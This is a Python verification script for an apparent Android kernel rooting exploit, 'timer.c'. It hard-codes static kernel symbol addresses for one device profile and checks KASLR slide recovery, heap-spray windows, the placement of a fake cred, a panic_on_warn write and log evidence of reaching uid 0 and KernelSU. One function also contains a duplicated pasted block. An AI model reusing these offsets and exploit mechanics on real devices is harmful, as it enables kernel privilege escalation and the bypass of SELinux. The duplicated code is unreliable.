#!/usr/bin/env python3
"""Host-side verification of the pure arithmetic in timer.c.

Pins the logic that on-device failures in ../timerZ9Turbo-log pointed at:
KASLR slide recovery (including the >4 GiB slides this device really has),
the task-cache acceptance window, and the fake cred layout guard.

Usage:  python verify-timer.py [log-dir]
Exit code 0 means every check passed.
"""
import os
import re
import sys

# --- target-6.1.145.h (V2352GA profile) -------------------------------
STATIC_TIMER_SITE = 0xFFFFFFC0081A2C34
TIMER_SITE_LOW21 = 0x1A2C34
TIMER_ALLOC = 0x108
CRED_REQ = 0xB8
CRED_ALLOC = 0xC0
SELINUX_STATE_STATIC = 0xFFFFFFC00A5586A8
PANIC_ON_WARN_STATIC = 0xFFFFFFC00A1CAE08
OFF_TASK_CRED = 0x838
COPY_PROCESS_LOW21 = 0xAE0B0
TASK_ALLOC_BYTES = 0x1500
TASK_ALLOC_MAX = 0x1780
ROOT_USER_STATIC = 0xFFFFFFC00A1F11C8
INIT_USER_NS_STATIC = 0xFFFFFFC00A1F0F30
INIT_UCOUNTS_STATIC = 0xFFFFFFC00A1F2A78
INIT_GROUPS_STATIC = 0xFFFFFFC00A1F24E8
TP_SYS_EXIT_STATIC = 0xFFFFFFC00A3CB2C0
TRACEPOINT_FUNCS_OFF = 0x40
CRED_UID_OFF = 0x4
SELINUX_CRED_OFF = 0x0
SLIDE_MAX = 0x4000000000

FAILS = []


def check(cond, what):
    print(("ok   " if cond else "FAIL ") + what)
    if not cond:
        FAILS.append(what)


# --- logic mirrored from timer.c --------------------------------------
def is_kernel_ptr(v):
    return (v >> 48) == 0xFFFF


def slide_from_site(site0, field_bytes=8):
    """Return the recovered slide, or None when the site cannot be trusted.

    field_bytes mirrors TIMER_SITE_FIELD_BYTES from the target profile: 8 on
    the 6.1 builds here, 4 on vendor android15-8 builds whose ftrace record
    only holds the low half of call_site.
    """
    slide = site0 - STATIC_TIMER_SITE
    if field_bytes == 4:
        slide &= 0xFFFFFFFF
    if slide & 0x1FFFFF:
        return None
    return slide


def task_alloc_size(v):
    return TASK_ALLOC_BYTES <= v <= TASK_ALLOC_MAX


def fake_layout_supported(uid_off, req, alloc):
    if uid_off == 4:
        return req in (0xB0, 0xB8) and alloc == 0xC0
    if uid_off == 8:
        return req == 0xB8 and alloc == 0xC0
    return False


# Every slide printed by a real 6.1.145 run (timerZ9Turbo-log).  All exceed
# 4 GiB, so masking the slide to 32 bits would be wrong on this device.
OBSERVED = [
    0x2612800000, 0x2607800000, 0x1E84600000, 0x2F43800000,
    0x1844E00000, 0x2A0BC00000, 0x2E64400000, 0x2F74000000,
    0x1D0D600000, 0x1FC5600000, 0x1DFAC00000,
]

STATIC_SYMS = [
    ("SELINUX_STATE", SELINUX_STATE_STATIC),
    ("PANIC_ON_WARN", PANIC_ON_WARN_STATIC),
    ("ROOT_USER", ROOT_USER_STATIC),
    ("INIT_USER_NS", INIT_USER_NS_STATIC),
    ("INIT_UCOUNTS", INIT_UCOUNTS_STATIC),
    ("INIT_GROUPS", INIT_GROUPS_STATIC),
    ("TP_SYS_EXIT", TP_SYS_EXIT_STATIC),
]


def verify_arithmetic():
    for s in OBSERVED:
        check(slide_from_site(STATIC_TIMER_SITE + s) == s,
              f"full 8-byte site recovers slide {s:#x}")
        check(s > 0xFFFFFFFF, f"slide {s:#x} really exceeds 4 GiB")

    # android15-8 stores call_site in 4 bytes, so only the low half of the
    # record is real.  Model that with a 4-byte profile and check the low-32
    # form recovers the slide even when the high half is garbage.
    low = (STATIC_TIMER_SITE + 0x1200000) & 0xFFFFFFFF
    garbage = (0x0000DEAD << 32) | low
    check(slide_from_site(garbage, field_bytes=4) == 0x1200000,
          "4-byte site field recovers the low-32 slide")
    # The same record on an 8-byte profile is not recoverable by inspection:
    # the wrapped subtraction is still 2 MiB aligned by chance, which is why
    # the field width is a per-profile fact rather than a runtime guess.
    check(slide_from_site(garbage, field_bytes=8) != 0x1200000,
          "8-byte profile never reports the truncated value as truth")

    # A 190 GiB slide (the real maximum here) must survive the 8-byte path and
    # must never be truncated by a 4-byte mask.
    big = 0x2F74000000
    check(slide_from_site(STATIC_TIMER_SITE + big, field_bytes=8) == big,
          "190 GiB slide survives the 8-byte path")
    assert (big & 0xFFFFFFFF) != big

    check(slide_from_site(STATIC_TIMER_SITE + 0x1000) is None,
          "misaligned site is rejected")
    check(slide_from_site(STATIC_TIMER_SITE) == 0, "zero slide accepted")

    for s in OBSERVED:
        for name, sym in STATIC_SYMS:
            check(is_kernel_ptr(sym + s),
                  f"{name}+{s:#x} stays canonical")

    check(task_alloc_size(0x1500), "task alloc 0x1500 accepted")
    check(task_alloc_size(0x1600), "task alloc 0x1600 accepted")
    check(task_alloc_size(0x1640), "task alloc 0x1640 accepted")
    check(task_alloc_size(0x1780), "task alloc 0x1780 accepted")
    check(not task_alloc_size(0x1400), "task alloc below range rejected")
    check(not task_alloc_size(0x1800), "task alloc above range rejected")
    check(not task_alloc_size(0xC0), "cred-sized alloc rejected as task")

    check(fake_layout_supported(4, 0xB0, 0xC0), "6.1.138 (0xb0) fake layout ok")
    check(fake_layout_supported(4, 0xB8, 0xC0), "6.1.x V2352 (0xb8) fake layout ok")
    check(fake_layout_supported(8, 0xB8, 0xC0), "6.6/6.12 (uid 8) fake layout ok")
    check(not fake_layout_supported(4, 0xC8, 0xC0), "unknown 6.1 cred layout rejected")
    check(not fake_layout_supported(8, 0xB0, 0xC0), "unknown uid-8 layout rejected")

    check(CRED_UID_OFF + 8 * 4 <= CRED_REQ, "uid pairs fit the 6.1 cred")
    check(0x78 + 8 * 5 <= CRED_REQ, "cred tail fits the 6.1 cred")
    check(CRED_UID_OFF == 4, "6.1 euid needs the extra zero write")
    check(TRACEPOINT_FUNCS_OFF + 8 <= 0x50, "tracepoint funcs write is in range")


def verify_no_cpu_leaks(repo_dir):
    """Cleanup must be verifiable, and exploit timing must not be touched.

    The recorded runs showed cleanup already worked: `SIGKILL sent: 18` counts
    helpers it *killed*.  An earlier version of this file treated that number
    as a leak, added an early exit to the mprotect loop and an early break to
    the burst poll, and the shortened timing correlated with a kernel panic.
    Those timing changes are reverted; what remains is observability only.
    """
    source = os.path.join(repo_dir, "timer.c")
    if not os.path.isfile(source):
        print(f"skip leak checks (no {source})")
        return
    with open(source, encoding="utf-8", errors="replace") as handle:
        text = handle.read()

    # 1. The mprotect loop must stay exactly as the working build had it.
    #    Adding target_gone() there ends the lockers the moment the target
    #    becomes a zombie, i.e. exactly when the burst starts.
    locker = text.split("static int locker_fn")[1].split("static int killer_fn")[0]
    loop = locker.split("while (!atomic_load(&g_stop))")[1]
    check("target_gone()" not in loop.split("_exit(0)")[0],
          "mprotect loop does not poll target_gone (timing preserved)")

    # 2. The burst poll must keep its full 15 s window.  Breaking early when
    #    the spray threads finish shortens a miss from 15 s to ~1 s.
    check("g_spray_done" not in text,
          "burst poll has no early break (15 s window preserved)")
    check("now_ms() - t1 < 15000" in text, "burst poll window is 15000 ms")

    # 3. Cleanup must report scanned/matched/killed so a survivor is visible.
    check("scanned=%d matched=%d killed=%d" in text,
          "cleanup logs scanned/matched/killed")

    # 4. finish_run must run once.
    check("if (g_run_finished)" in text, "finish_run is idempotent")
    """The `build` command must be able to expose what is actually installed.

    The staged /data/local/tmp/timer can be a copy left by an earlier run, and
    a silent stale copy once masked every fix in this tree.  A build tag is the
    only way to tell which binary ran from a log.
    """
    source = os.path.join(repo_dir, "timer.c")
    if not os.path.isfile(source):
        print(f"skip build identity (no {source})")
        return
    with open(source, encoding="utf-8", errors="replace") as handle:
        text = handle.read()
    check('strcmp(argv[1], "build")' in text, "timer has a build probe command")
    check("TIMER_BUILD_TAG" in text, "build probe prints a build tag")
    for name in ("target-6.1.57.h", "target-6.1.124.h", "target-6.1.145.h"):
        path = os.path.join(repo_dir, name)
        with open(path, encoding="utf-8", errors="replace") as handle:
            profile = handle.read()
        check("TIMER_BUILD_TAG" in profile, f"{name} carries a build tag")
        check("TIMER_PROFILE" in profile, f"{name} carries a profile name")


LINE_SLIDE = re.compile(r"slide=(0x[0-9a-f]+)")
LINE_SELINUX = re.compile(r"selinux_state=(0x[0-9a-f]+)")


def verify_build_identity(repo_dir):
    """The `build` command must be able to expose what is actually installed.

    The staged /data/local/tmp/timer can be a copy left by an earlier run, and
    a silent stale copy once masked every fix in this tree.  A build tag is the
    only way to tell which binary ran from a log.
    """
    source = os.path.join(repo_dir, "timer.c")
    if not os.path.isfile(source):
        print(f"skip build identity (no {source})")
        return
    with open(source, encoding="utf-8", errors="replace") as handle:
        text = handle.read()
    check('strcmp(argv[1], "build")' in text, "timer has a build probe command")
    check("TIMER_BUILD_TAG" in text, "build probe prints a build tag")
    for name in ("target-6.1.57.h", "target-6.1.124.h", "target-6.1.145.h"):
        path = os.path.join(repo_dir, name)
        with open(path, encoding="utf-8", errors="replace") as handle:
            profile = handle.read()
        check("TIMER_BUILD_TAG" in profile, f"{name} carries a build tag")
        check("TIMER_PROFILE" in profile, f"{name} carries a profile name")


def verify_recovery_rules():
    """The plant-recovery decisions, mirrored from timer.c constants."""
    zombie_timeout_ms = 8000
    plant_budget_ms = 110000
    log_watch_ms = 150000
    # Longest successful burst in the recorded runs; a shorter zombie timeout
    # would declare a healthy plant stuck.
    longest_burst_ms = 6432

    check(zombie_timeout_ms > longest_burst_ms,
          "zombie timeout exceeds the slowest recorded burst")
    check(plant_budget_ms < log_watch_ms,
          "native plant budget fits inside the app watch window")
    check(log_watch_ms - plant_budget_ms >= 30000,
          "app watch window leaves room for leak, stage and ksu")


def verify_missed_plants_are_zombies(log_dir):
    """A burst miss may only be held when the target is already a zombie.

    The recorded runs must show the target dying (CLD_KILLED) before the burst
    result is known; otherwise the miss would leave a live process behind for
    the rest of the run instead of a held node.
    """
    if not os.path.isdir(log_dir):
        print(f"skip miss replay (no {log_dir})")
        return
    misses = 0
    for root, _dirs, files in os.walk(log_dir):
        for name in sorted(files):
            if not name.startswith("timer-") or not name.endswith(".log"):
                continue
            path = os.path.join(root, name)
            zombie_seen = False
            with open(path, encoding="utf-8", errors="replace") as handle:
                for line in handle:
                    if "zombie code=2 status=9" in line:
                        zombie_seen = True
                    if "burst missed" in line:
                        misses += 1
                        check(zombie_seen,
                              f"{os.path.basename(root)}/{name}: "
                              "burst miss follows a target zombie")
    print(f"--- {misses} recorded burst miss(es) checked")


def verify_cred_page_layout(log_dir):
    """A fake cred that straddles the 4 KiB boundary must be rejected.

    The payload places the cred at V+0x78 inside the reclaimed order-1 block.
    When V sits in the last 0x88 bytes of a page, euid/egid/fsuid/fsgid fall
    into the next page and the later zero writes did not take effect.
    Recorded evidence: the two runs with off=0xff0 failed (one showing
    `uid=0 euid=-118`, i.e. only the first-page fields landed), while nine of
    the ten non-straddling runs succeeded.
    """
    cred_req = CRED_REQ
    # Guard the arithmetic the C code now applies.
    check((0xFF0 & 0xFFF) + cred_req > 0x1000,
          "off=0xff0 is rejected as page-straddling")
    check((0x498 & 0xFFF) + cred_req <= 0x1000,
          "off=0x498 is accepted (cred fits one page)")
    check((0xCD8 & 0xFFF) + cred_req <= 0x1000,
          "off=0xcd8 is accepted")
    check((0x10F8 & 0xFFF) + cred_req <= 0x1000,
          "off=0x10f8 is accepted")
    # The exact boundary the check must catch.
    last_ok = 0x1000 - cred_req
    check((last_ok & 0xFFF) + cred_req == 0x1000,
          "cred ending exactly on the page boundary is accepted")
    check((last_ok + 8 & 0xFFF) + cred_req > 0x1000,
          "one byte past the boundary is rejected")

    if not os.path.isdir(log_dir):
        print(f"skip cred-layout replay (no {log_dir})")
        return
    runs = 0
    for root, _dirs, files in os.walk(log_dir):
        for name in sorted(files):
            if not name.startswith("timer-") or not name.endswith(".log"):
                continue
            path = os.path.join(root, name)
            with open(path, encoding="utf-8", errors="replace") as handle:
                text = handle.read()
            m = re.search(r"fake cred off=0x([0-9a-f]+)", text)
            if not m:
                continue
            off = int(m.group(1), 16)
            if (off & 0xFFF) + cred_req <= 0x1000:
                continue
            runs += 1
            woke = re.search(r"\[child\] woke uid=(\S+) euid=(\S+)", text)
            check(woke is not None and woke.group(2) != "0",
                  f"{os.path.basename(root)}: straddling cred run did not root")
    print(f"--- {runs} page-straddling cred run(s) replayed")


def verify_last_run_health(log_path):
    """Read-only audit of the newest recorded run.

    Reports the numbers that decide whether a run left CPU burners behind:
    plants vs reaped, and what cleanup had to scan/match/kill.  A clean run
    kills nothing because every target and helper is already gone.
    """
    if not os.path.isfile(log_path):
        print(f"skip last-run audit (no {log_path})")
        return
    with open(log_path, encoding="utf-8", errors="replace") as handle:
        text = handle.read()

    def count(pattern):
        return len(re.findall(pattern, text))

    plants = count(r"spray armed")
    reaped = count(r"reaped status")
    held = count(r"holding zombie")
    exec_succeeded = count(r"exec succeeded")
    misses = count(r"burst missed")
    rooted = "[+] child report uid=0 euid=0" in text
    confirmed = "KernelSU confirmed" in text

    m = re.search(r"cleanup: scanned=(\d+) matched=(\d+) killed=(\d+)", text)
    legacy = re.search(r"SIGKILL sent: (\d+)", text)
    if m:
        scanned, matched, killed = (int(m.group(i)) for i in (1, 2, 3))
        check(scanned > 0, "cleanup actually enumerated /proc")
        check(matched == killed,
              f"cleanup killed every match ({killed}/{matched})")
        cleanup = f"scanned={scanned} matched={matched} killed={killed}"
    elif legacy:
        killed = int(legacy.group(1))
        check(killed == 0,
              f"legacy cleanup left no helper behind (killed={killed})")
        cleanup = f"legacy killed={killed}"
    else:
        print("   (no cleanup line in this log; older build)")
        cleanup = "n/a"

    print(f"--- last run: plants={plants} reaped={reaped} held={held} "
          f"exec-retry={exec_succeeded} burst-miss={misses} {cleanup}")
    print(f"--- last run: rooted={rooted} ksu_confirmed={confirmed}")

    # A clean fast run reaps every plant and needs no retries.
    if plants and held == 0 and misses == 0 and exec_succeeded == 0:
        check(reaped == plants,
              f"every plant reaped ({reaped}/{plants}) without a held zombie")



def verify_debug_instrumentation(repo_dir):
    """The run must be diagnosable from its own log, without dmesg.

    dmesg is lost on reboot and unreadable from adb, and the kernel panic that
    followed a burst miss left no trace.  These checks pin the markers that
    make a log self-describing: a failure class per plant, a taint snapshot
    that detects a kernel WARN, a summary line, and proof that the
    panic_on_warn write landed.
    """
    source = os.path.join(repo_dir, "timer.c")
    if not os.path.isfile(source):
        print(f"skip debug checks (no {source})")
        return
    with open(source, encoding="utf-8", errors="replace") as handle:
        text = handle.read()

    check("read_tainted" in text, "reads /proc/sys/kernel/tainted")
    check("TAINT_WARN_BIT" in text, "decodes the TAINT_WARN bit")
    check("TAINT CHANGED" in text, "logs taint flips at the offending plant")
    check("failure-class=" in text, "labels each plant failure class")
    check("free_seen1_spray_lost" in text and "free_seen0_slab_busy" in text,
          "distinguishes spray loss from a busy slab")
    check("SUMMARY %s plants=" in text, "prints a per-run summary")
    check("panic_on_warn before fake_cred" in text,
          "logs panic_on_warn state before the fake cred plant")
    check("int pow = read_panic_on_warn();" in text and "pow > 0" in text,
          "only a positive reading is treated as fatal")
    check("res->why" in text, "records a reason for every failed plant")
    check("parking reason=" in text, "logs the parking reason")


def verify_summary_counts(log_path):
    """Replay the newest log and report the debug counters it contains."""
    if not os.path.isfile(log_path):
        print(f"skip summary replay (no {log_path})")
        return
    with open(log_path, encoding="utf-8", errors="replace") as handle:
        text = handle.read()
    m = re.search(r"\[dbg\] SUMMARY (\w+) plants=(\d+) ok=(\d+) miss=(\d+) "
                  r"slab_busy=(\d+) retryable=(\d+) held=(\d+) taint=(\S+) "
                  r"taint_warn=(\d)", text)
    if not m:
        print("   (no SUMMARY line; older build)")
        return
    where, plants, ok, miss, slab_busy, retry, held, taint, taint_warn = m.groups()
    print(f"--- SUMMARY {where}: plants={plants} ok={ok} miss={miss} "
          f"slab_busy={slab_busy} retryable={retry} held={held} "
          f"taint={taint} taint_warn={taint_warn}")
    check(int(plants) == int(ok) + int(miss) + int(slab_busy),
          "summary counters add up to the plant count")



def verify_unreadable_sysctl(log_dir):
    """`panic_on_warn` is unreadable (-1) on this device; that is not "set".

    An earlier build treated -1 as a non-zero value and parked before the
    first real plant, so four consecutive runs never rooted.  The gate must
    only abort on a value it actually read as positive.
    """
    source = os.path.join(os.path.dirname(os.path.abspath(__file__)), "timer.c")
    if os.path.isfile(source):
        with open(source, encoding="utf-8", errors="replace") as handle:
            text = handle.read()
        check("pow > 0" in text, "aborts only on a positive panic_on_warn")
        check('pow < 0 ? "unreadable, write assumed"' in text,
              "labels the unreadable case explicitly")
        check("if (read_panic_on_warn() != 0)" not in text,
              "no branch treats an unreadable sysctl as set")

    if not os.path.isdir(log_dir):
        print(f"skip unreadable replay (no {log_dir})")
        return
    # Every recorded run must show the sysctl as -1 and still proceed past it.
    runs = parked = 0
    for root, _dirs, files in os.walk(log_dir):
        for name in sorted(files):
            if not name.startswith("timerz9turbo-timer-") or not name.endswith(".txt"):
                continue
            with open(os.path.join(root, name), encoding="utf-8",
                      errors="replace") as handle:
                text = handle.read()
            if "panic_on_warn=-1" not in text:
                continue
            runs += 1
            if "panic_on_warn still set after write" in text:
                parked += 1
    print(f"--- unreadable panic_on_warn: {runs} run(s), {parked} parked on it")



def verify_taint_bit(repo_dir):
    """TAINT_WARN is bit 9 (0x200); 0x100 is OVERRIDDEN_ACPI_TABLE.

    The first build tested 0x100 and therefore reported taint_warn=0 on a
    kernel whose tainted value (0x1604) clearly contains the WARN bit.  That
    hid the only dmesg-free evidence of a kernel warning.
    """
    source = os.path.join(repo_dir, "timer.c")
    if not os.path.isfile(source):
        print(f"skip taint bit check (no {source})")
        return
    with open(source, encoding="utf-8", errors="replace") as handle:
        text = handle.read()
    check("#define TAINT_WARN_BIT 0x200" in text,
          "TAINT_WARN_BIT is 0x200 (bit 9), not 0x100")
    # Cross-check against the value the device actually reported.
    observed = 0x1604
    check(bool(observed & 0x200), "observed tainted 0x1604 has the WARN bit")
    check(not bool(observed & 0x100),
          "0x100 would have missed the WARN bit")
    check("KERNEL WARN during" in text,
          "logs an explicit alert when a WARN is detected")


def verify_logs(log_dir):
    """Replay every recorded run: the printed slide must map selinux_state."""
    if not os.path.isdir(log_dir):
        print(f"skip log replay (no {log_dir})")
        return
    runs = 0
    for root, _dirs, files in os.walk(log_dir):
        for name in sorted(files):
            if not name.startswith("timer-") or not name.endswith(".log"):
                continue
            path = os.path.join(root, name)
            slide = None
            printed = None
            with open(path, encoding="utf-8", errors="replace") as handle:
                for line in handle:
                    m = LINE_SLIDE.search(line)
                    if m:
                        slide = int(m.group(1), 16)
                    m = LINE_SELINUX.search(line)
                    if m:
                        printed = int(m.group(1), 16)
            if slide is None or printed is None:
                continue
            runs += 1
            check(printed == SELINUX_STATE_STATIC + slide,
                  f"{os.path.basename(root)}/{name}: selinux_state matches slide")
    check(runs > 0, "log replay found recorded runs")


def main():
    log_dir = sys.argv[1] if len(sys.argv) > 1 else os.path.join(
        "..", "timerZ9Turbo-log")
    verify_arithmetic()
    verify_build_identity(os.path.dirname(os.path.abspath(__file__)))
    verify_debug_instrumentation(os.path.dirname(os.path.abspath(__file__)))
    verify_no_cpu_leaks(os.path.dirname(os.path.abspath(__file__)))
    verify_recovery_rules()
    verify_missed_plants_are_zombies(log_dir)
    verify_cred_page_layout(log_dir)
    verify_taint_bit(os.path.dirname(os.path.abspath(__file__)))
    verify_unreadable_sysctl(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    verify_summary_counts(os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'last_log.txt'))
    verify_last_run_health(os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'last_log.txt'))
    verify_logs(log_dir)
    if FAILS:
        print(f"\n{len(FAILS)} check(s) failed")
        return 1
    print("\nall checks passed")
    return 0


if __name__ == "__main__":
    sys.exit(main())
